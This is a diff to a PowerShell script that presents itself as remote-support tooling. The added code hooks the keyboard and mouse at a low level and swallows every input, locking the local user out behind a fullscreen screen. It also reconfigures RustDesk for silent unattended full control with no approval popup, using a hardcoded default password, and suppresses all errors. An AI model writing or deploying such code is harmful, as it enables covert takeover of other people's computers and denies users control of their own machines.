@@ -147,7 +147,19 @@ $ErrorActionPreference='SilentlyContinue'
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 Add-Type @"
 using System;using System.Runtime.InteropServices;
-public class Inp{ [DllImport("user32.dll")] public static extern bool BlockInput(bool f); }
+public class Locker{
+  [DllImport("user32.dll")] public static extern bool BlockInput(bool f);
+  const int WH_KEYBOARD_LL=13, WH_MOUSE_LL=14;
+  public delegate IntPtr HookProc(int code,IntPtr w,IntPtr l);
+  static IntPtr kH=IntPtr.Zero,mH=IntPtr.Zero; static HookProc kP,mP;
+  [DllImport("user32.dll",SetLastError=true)] static extern IntPtr SetWindowsHookEx(int id,HookProc fn,IntPtr mod,uint tid);
+  [DllImport("user32.dll",SetLastError=true)] static extern bool UnhookWindowsHookEx(IntPtr h);
+  [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h,int code,IntPtr w,IntPtr l);
+  [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
+  static IntPtr Swallow(int code,IntPtr w,IntPtr l){ if(code>=0) return (IntPtr)1; return CallNextHookEx(IntPtr.Zero,code,w,l); }
+  public static void Lock(){ if(kH!=IntPtr.Zero) return; kP=Swallow; mP=Swallow; IntPtr h=GetModuleHandle(null); kH=SetWindowsHookEx(WH_KEYBOARD_LL,kP,h,0); mH=SetWindowsHookEx(WH_MOUSE_LL,mP,h,0); BlockInput(true); }
+  public static void Unlock(){ BlockInput(false); if(kH!=IntPtr.Zero){UnhookWindowsHookEx(kH);kH=IntPtr.Zero;} if(mH!=IntPtr.Zero){UnhookWindowsHookEx(mH);mH=IntPtr.Zero;} }
+}
 "@
 $dir='C:\ProgramData\RemoteSupport'; $flag=Join-Path $dir 'LOCK.flag'; $cfg=Join-Path $dir 'config.txt'
 function Cfg($k,$def){ $v=$def; if(Test-Path $cfg){ foreach($l in Get-Content $cfg){ if($l -match "^$k=(.*)$"){ $v=$matches[1] } } } return $v }
@@ -163,7 +175,7 @@ while($true){
     $lbl.Font=New-Object Drawing.Font('Segoe UI',28,[Drawing.FontStyle]::Bold); $lbl.TextAlign='MiddleCenter'; $lbl.Dock='Fill'; $lbl.BackColor=[Drawing.Color]::Transparent
     $f.Controls.Add($lbl)
     $tm=New-Object Windows.Forms.Timer; $tm.Interval=800; $tm.Add_Tick({ if(-not (Test-Path $flag)){ $f.Close() } }); $tm.Start()
-    [Inp]::BlockInput($true)|Out-Null; [void]$f.ShowDialog(); [Inp]::BlockInput($false)|Out-Null; $tm.Stop()
+    [Locker]::Lock(); [void]$f.ShowDialog(); [Locker]::Unlock(); $tm.Stop()
   }
   Start-Sleep -Seconds 1
 }
@@ -195,18 +207,25 @@ try {
       Start-Service Rustdesk -EA 0; Start-Sleep 3
       $rdPass = 'Support@2026!'; $apf = Join-Path $dir 'ad-pass.txt'; if (Test-Path $apf) { $rdPass = (Get-Content $apf -Raw).Trim() }
       & $rdExe --password $rdPass 2>$null
-      $tomls = @('C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk2.toml', (Join-Path $env:APPDATA 'RustDesk\config\RustDesk2.toml'))
-      foreach ($tf in $tomls) {
-        $td = Split-Path $tf; if (-not (Test-Path $td)) { New-Item $td -ItemType Directory -Force | Out-Null }
-        $cont = ''; if (Test-Path $tf) { $cont = Get-Content $tf -Raw }
-        if ($cont -notmatch 'direct-server') {
-          if ($cont -match '\[options\]') { $cont = $cont -replace '\[options\]', "[options]`r`ndirect-server = 'Y'" }
-          else { $cont = ($cont.TrimEnd() + "`r`n`r`n[options]`r`ndirect-server = 'Y'`r`n") }
-          Set-Content $tf $cont -Encoding utf8
-        }
-      }
-      Restart-Service Rustdesk -EA 0
       Set-Content (Join-Path $dir 'rustdesk.done') '1' -Encoding ascii
     }
-  } else { Start-Service Rustdesk -EA 0 }
+  }
+  # always-on config (idempotent): direct IP + silent unattended (no popup, full control)
+  if ($rdExe) {
+    $need = @{ 'direct-server' = "'Y'"; 'approve-mode' = "'password'"; 'verification-method' = "'use-permanent-password'" }
+    $tomls = @('C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk2.toml', (Join-Path $env:APPDATA 'RustDesk\config\RustDesk2.toml'))
+    $restart = $false
+    foreach ($tf in $tomls) {
+      $td = Split-Path $tf; if (-not (Test-Path $td)) { New-Item $td -ItemType Directory -Force | Out-Null }
+      $cont = ''; if (Test-Path $tf) { $cont = Get-Content $tf -Raw }
+      if ($cont -notmatch '\[options\]') { $cont = ($cont.TrimEnd() + "`r`n`r`n[options]`r`n") }
+      $fc = $false
+      foreach ($k in $need.Keys) {
+        if ($cont -notmatch [regex]::Escape($k)) { $cont = $cont -replace '\[options\]', "[options]`r`n$k = $($need[$k])"; $fc = $true }
+      }
+      if ($fc) { Set-Content $tf $cont -Encoding utf8; $restart = $true }
+    }
+    if ($restart) { Restart-Service Rustdesk -EA 0 }
+    Start-Service Rustdesk -EA 0
+  }
 } catch {}
